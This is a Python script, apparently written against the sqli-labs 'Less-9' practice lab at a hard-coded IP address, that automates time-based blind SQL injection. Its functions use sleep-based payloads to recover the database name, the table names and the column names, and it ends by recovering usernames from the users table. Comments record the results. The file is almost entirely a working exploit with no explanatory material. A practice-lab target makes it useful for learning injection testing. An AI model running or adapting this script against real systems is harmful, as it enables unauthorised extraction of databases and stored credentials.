# coding=utf-8
import string

import requests


def get_database():
    mystring = string.printable  # ??????
    url = 'http://111.231.88.117/sqli_lab/sqli-labs-php7/Less-9/'
    url += '?id=1\' and (select case when (substring((database()) from {0} for 1)=\'{1}\') then sleep(2) else 1 end)-- -'
    print(url)
    count = 1
    result = ''
    while (True):
        temp_result = result
        for char in mystring:
            try:
                response = requests.get(url.format(count, char), timeout=2)
            except requests.exceptions.ReadTimeout:
                result += char
                print(result + '......')
                break
        if result == temp_result:
            print('result: ' + result)
            break
        if '+++' in result:
            print('result: ' + result[0:-3])
            break
        count += 1

    # result: security

def get_tables():
    # select table_name from information_schema.tables where table_schema='?????'
    mystring = string.printable  # ??????
    url = 'http://111.231.88.117/sqli_lab/sqli-labs-php7/Less-9/'
    url += '?id=1\' and (select case when (substring((select group_concat(table_name) from information_schema.tables where table_schema=\'security\') from {0} for 1)=\'{1}\') then sleep(2) else 1 end)-- -'
    print(url)
    count = 1
    result = ''
    while (True):
        temp_result = result
        for char in mystring:
            try:
                # print(url.format(count,char))
                response = requests.get(url.format(count, char), timeout=2)
            except requests.exceptions.ReadTimeout:
                result += char
                print(result + '......')
                break
        if result == temp_result:
            print('result: ' + result)
            break
        if '+++' in result:
            print('result: ' + result[0:-3])
            break
        count += 1

    # result: emails, referers, uagents, users

def get_columns_by_table_name(table_name):
    # select COLUMN_NAME from information_schema.COLUMNS where table_name = 'your_table_name' and table_schema = 'your_db_name';
    mystring = string.printable  # ??????
    url = 'http://111.231.88.117/sqli_lab/sqli-labs-php7/Less-9/'
    url += '?id=1\' and (select case when (substring((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_schema=\'security\' and table_name = \'{0}\') from {1} for 1)=\'{2}\') then sleep(2) else 1 end)-- -'
    print(url)
    count = 1
    result = ''
    while (True):
        temp_result = result
        for char in mystring:
            try:
                # print(url.format(count,char))
                response = requests.get(url.format(table_name, count, char), timeout=2)
            except requests.exceptions.ReadTimeout:
                result += char
                print(result + '......')
                break
        if result == temp_result:
            print('result: ' + result)
            break
        if '+++' in result:
            print('result: ' + result[0:-3])
            break
        count += 1
    # emails: id,email_id
    # referers: id,referer,ip_address
    # uagents: id,uagent,ip_address,username
    # users: id,username,password

def get_value_by_table_name_and_table_column(table_name, table_column):
    # select COLUMN_NAME from information_schema.COLUMNS where table_name = 'your_table_name' and table_schema = 'your_db_name';
    mystring = string.printable  # ??????
    url = 'http://111.231.88.117/sqli_lab/sqli-labs-php7/Less-9/'
    url += '?id=1\' and (select case when (substring((select group_concat({0}) from {1}),{2},1)=\'{3}\') then sleep(2) else 1 end)-- -'
    print(url)
    count = 1
    result = ''
    while (True):
        temp_result = result
        for char in mystring:
            try:
                # print(url.format(table_column, table_name, count, char))
                response = requests.get(url.format(table_column, table_name, count, char), timeout=2)
            except requests.exceptions.ReadTimeout:
                result += char
                print(result + '......')
                break
        if result == temp_result:
            print('result: ' + result)
            break
        if '+++' in result:
            print('result: ' + result[0:-3])
            break
        count += 1

get_value_by_table_name_and_table_column("users", "username")